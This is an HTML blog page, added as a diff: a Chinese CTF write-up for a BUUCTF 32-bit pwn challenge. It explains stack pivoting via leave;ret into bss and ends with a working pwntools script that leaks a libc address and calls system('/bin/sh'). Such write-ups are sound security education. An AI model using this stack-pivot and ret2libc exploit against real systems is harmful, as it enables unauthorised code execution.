@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn [Black Watch 入群题]PWN | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn [Black Watch 入群题]PWN</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/04/01</h2>
+</div>
+
+<main>
+<h2 id="black-watch-入群题pwn">[Black Watch 入群题]PWN</h2>
+<p>考点</p>
+<p>1、栈溢出和栈迁移</p>
+<p>2、leak</p>
+<p>栈迁移主要利用leave；ret指令来完成，首先要明确esp和ebp这个两个寄存器确定一个栈空间</p>
+<p>esp指向栈顶，ebp指向栈底，eip寄存器指向即将执行的指令，每执行完一条指令后eip都会改变指向下一条指令</p>
+<p>leave  &lt;=&gt;  mov  esp,ebp;</p>
+<p>​					pop   ebp; 将esp栈顶所指的内容赋给ebp</p>
+<p>ret      &lt;=&gt;   pop  eip;  将esp栈顶所指的内容赋给eip</p>
+<p>以上的pop指令是将当前esp栈顶所指向的数据赋给指定的寄存器，并且把esp+4</p>
+<p>栈迁移，意味着调用函数将被掉函数的栈迁移到其他区域如bss或者data，需要RW权限，若有X权限则可以直接写入shellcode然后通过栈溢出ret到此shellcode执行</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200402003117210.png" alt="image-20200402003117210"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200402003331737.png" alt="image-20200402003331737"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200402003355101.png" alt="image-20200402003355101"></p>
+<p>本题先通过第一个read函数读入我们伪造的栈帧到bss，然后再用第二个read函数造成栈溢出同时执行栈迁移操作将栈迁移到伪造好栈数据的bss段执行，这里的bss只有读写权限没有执行权限，但是它只是作为一个栈存数据所以不影响我们的操作</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200402004013574.png" alt="image-20200402004013574"></p>
+<p>栈迁移实际是利用到这个retn之前的leave和我们溢出后构造的leave来执行栈迁移，首先要明确执行一个call的时候会将call的下一条指令push入栈中也就是在栈溢出中需要覆盖的retn地址，然后再将原调函数的ebp也push进栈，为了栈还原做准备，将执行call的函数的ebp保存进栈当执行完这个call之后就可以同通过这个保存的ebp找回原调函数的栈继续执行</p>
+<p>具体流程：</p>
+<p>1、通过栈溢出将ebp覆盖为我们栈迁移的目标地址，这样在执行到leave的时候就会讲esp指向这个被覆盖的ebp的位置(mov esp,ebp)，然后pop ebp；将我们覆盖掉的ebp存的地址作为栈底，这样栈底首先被迁移到目标地址了</p>
+<p>2、将retn覆盖为leave；ret；这个gadget，这样在ret之前还会之前还会执行一遍leave(mov esp,ebp;pop ebp)，这个时候的esp和ebp指向的位置都是栈迁移目标地址也就是程序中s的地址，实际上在本题中第二次leave中的pop ebp是多余的，还会使我们esp+4所以我们在覆盖ebp的时候可以覆盖为目标地址s-4的地址处这样在执行pop ebp的时候esp+4-4就抵消了，最后执行ret也就是pop eip将当前esp所指的内容赋给eip，这样程序下次执行的就是伪造在bss段中存的函数地址</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200402013952656.png" alt="image-20200402013952656"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#75715e">#sh = process(&#39;./spwn&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">27349</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./spwn</span><span style="color:#e6db74">&#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./x86_ubuntu16_libc-2.23.so</span><span style="color:#e6db74">&#39;</span>)
+
+bss_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a300</span> <span style="color:#75715e">#也就是s的地址</span>
+leave_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048408</span> <span style="color:#75715e">#gadget</span>
+
+write_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">write</span><span style="color:#e6db74">&#39;</span>]
+write_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">write</span><span style="color:#e6db74">&#39;</span>]
+main_addr <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">main</span><span style="color:#e6db74">&#39;</span>]
+<span style="color:#75715e">#第一轮执行leak出write地址来计算libc</span>
+payload <span style="color:#f92672">=</span> p32(write_plt) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p32(write_got) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">4</span>)
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">name?</span><span style="color:#e6db74">&#34;</span>,payload)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p32(bss_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">+</span> p32(leave_ret)
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">say?</span><span style="color:#e6db74">&#34;</span>,payload)
+<span style="color:#75715e">#接收leak</span>
+libc_write <span style="color:#f92672">=</span> u32(sh<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))
+<span style="color:#75715e">#计算基地址、system()地址、字符串/bin/sh地址</span>
+libc_base <span style="color:#f92672">=</span> libc_write <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">write</span><span style="color:#e6db74">&#39;</span>]
+system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">+</span> libc_base
+binsh_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>next() <span style="color:#f92672">+</span> libc_base
+<span style="color:#75715e">#第二轮执行栈溢出ret2libc</span>
+payload <span style="color:#f92672">=</span> p32(system_addr) <span style="color:#f92672">+</span> p32(main_addr) <span style="color:#f92672">+</span> p32(binsh_addr)
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">name?</span><span style="color:#e6db74">&#34;</span>,payload)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x18</span> <span style="color:#f92672">+</span> p32(bss_addr<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">+</span> p32(leave_ret)
+sh<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">say?</span><span style="color:#e6db74">&#34;</span>,payload)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200402014503258.png" alt="image-20200402014503258"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
